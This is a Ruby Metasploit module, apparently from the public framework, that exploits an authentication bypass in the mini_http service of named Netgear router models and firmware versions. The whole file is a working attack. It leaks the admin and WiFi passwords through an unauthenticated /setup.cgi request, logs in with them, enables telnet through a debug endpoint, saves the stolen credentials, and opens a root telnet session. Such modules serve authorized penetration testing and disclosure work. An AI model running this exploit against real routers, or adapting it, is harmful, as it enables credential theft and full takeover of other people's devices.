##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Netgear PNPX_GetShareFolderList Authentication Bypass',
        'Description' => %q{
          This module targets an authentication bypass vulnerability in the mini_http binary of several Netgear Routers
          running firmware versions prior to 1.2.0.88, 1.0.1.80, 1.1.0.110, and 1.1.0.84. The vulnerability allows
          unauthenticated attackers to reveal the password for the admin user that is used to log into the
          router's administrative portal, in plaintext.

          Once the password has been been obtained, the exploit enables telnet on the target router and then utiltizes
          the auxiliary/scanner/telnet/telnet_login module to log into the router using the stolen credentials of the
          admin user. This will result in the attacker obtaining a new telnet session as the "root" user.

          This vulnerability was discovered and exploited by an independent security researcher who reported it to SSD.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Unknown', # Vulnerability discovery and PoC creation.
          'Grant Willcox' # Metasploit Module
        ],
        'References' => [
          [ 'URL', 'https://kb.netgear.com/000063961/Security-Advisory-for-Authentication-Bypass-Vulnerability-on-the-D7000-and-Some-Routers-PSV-2021-0133' ],
          [ 'URL', 'https://ssd-disclosure.com/ssd-advisory-netgear-d7000-authentication-bypass/' ]
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS]
        },
        'RelatedModules' => [ 'exploit/linux/telnet/netgear_telnetenable' ], # This module relies on users also running exploit/linux/telnet/netgear_telnetenable to get the shell.
        'DisclosureDate' => '2021-09-06',
        'DefaultTarget' => 0
      )
    )
  end

  def check
    res = send_request_cgi(
      'uri' => '/top.html',
      'method' => 'GET'
    )

    if res.nil?
      return Exploit::CheckCode::Unknown('Connection timed out.')
    end

    unless res.headers['WWW-Authenticate'] =~ /netgear/i
      return Exploit::CheckCode::Safe('Target does not appear to be a Netgear router!')
    end

    # Retrieve model name and firmware version
    res = send_request_cgi({ 'uri' => '/currentsetting.htm' })
    if res.nil?
      return Exploit::CheckCode::Unknown('Connection timed out.')
    end

    data = res.to_s
    firmware_version = data.match(/^Firmware=V(\d+\.\d+\.\d+\.\d+)_(\d+\.\d+\.\d+)/)
    if firmware_version.nil?
      return Exploit::CheckCode::Unknown('Could not retrieve firmware version!')
    end

    major_version = firmware_version[1]
    minor_version = firmware_version[2]

    model_name = data.match(/Model=([a-zA-Z0-9]+)/)
    if model_name.nil?
      return Exploit::CheckCode::Unknown('Could not retrieve model of the router!')
    end

    model_name = model_name[1]

    # Check model is actually vulnerable
    vulnerable_router_models = ['AC2100', 'AC2400', 'AC2600', 'D7000', 'R6220', 'R6230', 'R6260', 'R6330', 'R6350', 'R6700v2', 'R6800', 'R6850', 'R6900v2', 'R7200', 'R7350', 'R7400', 'R7450']
    unless vulnerable_router_models.include?(model_name)
      return Exploit::CheckCode::Safe('Not a vulnerable router model!')
    end

    # Check version is vulnerable
    print_status("Target is a #{model_name} router running firmware version #{major_version}_#{minor_version}")
    if (Rex::Version.new(major_version) >= Rex::Version.new('1.2.0.0')) && (Rex::Version.new(major_version) < Rex::Version.new('1.2.0.88'))
      return Exploit::CheckCode::Appears
    elsif (Rex::Version.new(major_version) >= Rex::Version.new('1.0.1.0')) && (Rex::Version.new(major_version) < Rex::Version.new('1.0.1.80'))
      return Exploit::CheckCode::Appears
    elsif (Rex::Version.new(major_version) >= Rex::Version.new('1.1.0.0')) && (Rex::Version.new(major_version) < Rex::Version.new('1.1.0.110')) # Need more work on this as this isn't a good check for affected versions and may overlap with patched versions.
      return Exploit::CheckCode::Appears
    elsif (Rex::Version.new(major_version) >= Rex::Version.new('1.1.0.0')) && (Rex::Version.new(major_version) < Rex::Version.new('1.1.0.84')) # Need more work on this to make sure we apply this to the correct systems.
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe('Not a vulnerable router version!')
    end
  end

  def run
    print_status('Attempting to leak the password of the admin user...')
    res = send_request_cgi(
      'uri' => '/setup.cgi',
      'method' => 'GET',
      'vars_get' => {
        'next_file' => 'BRS_swisscom_success.html',
        'x' => 'todo=PNPX_GetShareFolderList'
      }
    )

    html_response = res.get_html_document
    leaked_info_array = []
    html_response.xpath('//div[@id="passpharse"]/following-sibling::div[@class="right_div"]').map { |node| leaked_info_array << node.text }
    unless leaked_info_array.include?('admin')
      fail_with(Failure::UnexpectedReply, 'Application did not respond with the expected admin username in its response!')
    end
    wifi_password = leaked_info_array[0]
    wifi_password_5g = leaked_info_array[1]
    username = leaked_info_array[2]
    password = leaked_info_array[3]

    network_names = html_response.xpath('//div[@id="network_name"]/following-sibling::div[@class="right_div"]')
    if network_names.length < 2
      print_warning('Application did not respond with an SSID in its response!')
    else
      wifi_ssid = network_names[1].text
    end

    network_names_5g = html_response.xpath('//div[@id="network_name_5G"]/following-sibling::div/child::text()')
    if network_names_5g.empty?
      print_warning('Application did not respond with an 5G SSID in its response!')
    else
      wifi_ssid_5g = network_names_5g.text
    end

    if wifi_ssid_5g.empty? || wifi_password_5g.empty?
      print_warning('5G SSID information contained blank strings, skipping saving this info to the database!')
    else
      # Create 5G WiFi credential
      wifi_data_5g = {
        origin_type: :import,
        address: datastore['RHOST'],
        module_fullname: fullname,
        workspace_id: myworkspace_id,
        filename: "wifi_#{wifi_ssid_5g}_creds.txt",
        username: wifi_ssid_5g,
        private_data: wifi_password_5g,
        private_type: :password
      }
      create_credential(wifi_data_5g)
    end

    if wifi_ssid.empty? || wifi_password.empty?
      print_warning('SSID information contained blank strings, skipping saving this info to the database!')
    else
      # Create regular WiFi credential
      wifi_data = {
        origin_type: :import,
        address: datastore['RHOST'],
        module_fullname: fullname,
        workspace_id: myworkspace_id,
        filename: "wifi_#{wifi_ssid}_creds.txt",
        username: wifi_ssid,
        private_data: wifi_password,
        private_type: :password
      }
      create_credential(wifi_data)
    end

    if username.empty? || password.empty?
      fail_with(Failure::UnexpectedReply, 'Application responded with expected content, but the matched content was an empty string for some reason!')
    end

    print_good("Can log into target router using username #{username} and password #{password}")

    print_status('Attempting to retrieve /top.html to verify we are logged in!')

    print_status('Sending one request to grab authorization cookie from headers...')
    cookie_jar.clear
    res = send_request_cgi(
      'uri' => '/top.html',
      'method' => 'GET',
      'keep_cookies' => 'true'
    )

    if res.nil?
      fail_with(Failure::Unreachable, 'Could not reach the target, something may have happened mid attempt!')
    end

    if cookie_jar.empty?
      fail_with(Failure::UnexpectedReply, "Router didn't respond with the expected Set-Cookie header to a response to /top.html!")
    end

    print_status('Got the authentication cookie, associating it with a logged in session...')
    res = send_request_cgi(
      'uri' => '/top.html',
      'method' => 'GET',
      'authorization' => basic_auth(username, password)
    )

    if res.nil?
      fail_with(Failure::Unreachable, 'Could not reach the target, something may have happened mid attempt!')
    end

    result = res.get_html_document
    if result.xpath("//div[@id='firm_version']/text()").empty? # Find all div tags with an "id" attribute named "firm_version" and find its text value.
      fail_with(Failure::UnexpectedReply, 'The target router did not respond with a firmware version when /top.html was requested. Are we logged in?')
    end

    print_good('Successfully logged into target router using the stolen credentials!')
    print_status('Attempting to store the stolen admin credentials for future use...')

    # Create HTTP Login Data
    store_valid_credential(user: username, private: password, private_type: :password)

    print_status('Enabling telnet on the target router...')
    res = send_request_cgi(
      'uri' => '/setup.cgi',
      'method' => 'GET',
      'vars_get' => {
        'todo' => 'debug'
      },
      'authorization' => basic_auth(username, password)
    )

    if res.nil?
      fail_with(Failure::Unreachable, 'Could not reach the target, something may have happened mid attempt!')
    end

    unless res.body.include?('Debug Enable!')
      fail_with(Failure::UnexpectedReply, 'Target did not enable debug mode for some reason!')
    end
    print_good('Telnet enabled on target router!')
    handler = framework.modules.create('auxiliary/scanner/telnet/telnet_login')
    handler.datastore['RHOSTS'] = datastore['RHOST']
    File.delete('netgear_pnpx_wordlist.txt') if File.exist?('netgear_pnpx_wordlist.txt') # Make sure the file is deleted if it already exists.
    file_handle = File.open('netgear_pnpx_wordlist.txt', 'wb')
    file_handle.write("#{username} #{password}")
    file_handle.close
    handler.datastore['USERPASS_FILE'] = 'netgear_pnpx_wordlist.txt'
    print_status("Attempting to log in with #{username}:#{password}. You should get a new telnet session as the root user")
    handler.run
    File.delete('netgear_pnpx_wordlist.txt') if File.exist?('netgear_pnpx_wordlist.txt') # Remove the file once we are done.
  end
end
